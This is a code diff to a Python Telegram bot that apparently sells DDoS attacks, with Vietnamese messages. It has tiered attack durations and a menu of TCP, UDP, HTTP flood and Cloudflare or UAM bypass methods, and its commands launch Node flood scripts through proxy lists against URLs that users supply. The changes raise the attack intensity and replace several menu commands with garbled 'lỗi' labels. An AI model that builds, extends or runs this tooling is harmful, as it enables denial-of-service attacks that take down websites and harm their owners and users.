@@ -28,7 +28,7 @@ def is_target_blocked(target):
 
 ADMIN_IDS = {7818408538}
 
-MAX_TIME_VIP = 20000
+MAX_TIME_VIP = 300
 MAX_TIME_BASIC = 150
 MAX_TIME_FREE = 60
 
@@ -232,11 +232,11 @@ def cmd_method(msg):
     bot.send_message(msg.chat.id,
         "📜 Danh sách METHOD \n\n"
         "LAYER 4: <description of method>\n"
-        "/tcp <Attack TCP>\n"
-        "/udp <Attack UDP>\n\n"
+        "/lỗi <Attack TCP>\n"
+        "/lỗi<Attack UDP>\n\n"
         "LAYER 7: <description of method>\n"
-        "/flood <Flood on website>\n"
-        "/https <Ddos with high request>\n"
+        "/lỗi<Flood on website>\n"
+        "/bị lỗi<Ddos with high request>\n"
         "/uam <Bypass UAM>\n"
         "/bypass <Bypass Cloudflare>\n"
     )
@@ -350,7 +350,7 @@ def flood_command(message):
     send_intro(message.chat.id, "attack.gif")
     send_attack_status(message.chat.id, url, port, duration, "FLOOD", message.from_user.id)
     try:
-        subprocess.Popen(["node", "flood", url, duration, "50", "5", "proxies.txt"])
+        subprocess.Popen(["node", "flood", url, duration, "90", "5", "proxies.txt"])
     except Exception as e:
         bot.send_message(message.chat.id, f"⚠️ Lỗi FLOOD: {e}")
  
@@ -363,7 +363,7 @@ def flood_command(message):
     send_intro(message.chat.id, "attack.gif")
     send_attack_status(message.chat.id, url, port, duration, "UAM", message.from_user.id)
     try:
-        subprocess.Popen(["node", "uam", url, duration, "50", "5", "proxies.txt"])
+        subprocess.Popen(["node", "uam", url, duration, "100", "5", "proxies.txt"])
     except Exception as e:
         bot.send_message(message.chat.id, f"⚠️ Lỗi UAM: {e}")
         
